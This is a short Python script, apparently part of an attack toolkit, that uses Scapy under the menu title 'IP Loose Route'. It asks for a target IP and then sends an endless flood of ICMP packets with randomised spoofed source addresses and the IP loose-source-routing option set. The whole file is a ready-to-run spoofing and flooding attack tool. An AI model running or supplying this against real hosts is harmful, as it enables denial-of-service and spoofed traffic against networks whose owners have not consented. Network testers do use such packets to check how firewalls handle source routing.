import scapy.all as scapy
import os


def IP_Loose_Route():

	clear = os.system('clear')
	print("**************************************")
	print("         IP Loose Route")
	print("**************************************")

	print("Please input your target's IP ")
	target = input("[Loose_Route]#")
	num =0
	try:
		while True:
			packet = scapy.IP(src=scapy.RandIP(),dst=target,options=[scapy.IPOption_LSRR(),scapy.IPOption_EOL()])/scapy.ICMP()
			scapy.send(packet,verbose=False)
			num += 1
			print("Sent "+str(num)+" packets")
	except KeyboardInterrupt:
		print("quit")
	
IP_Loose_Route()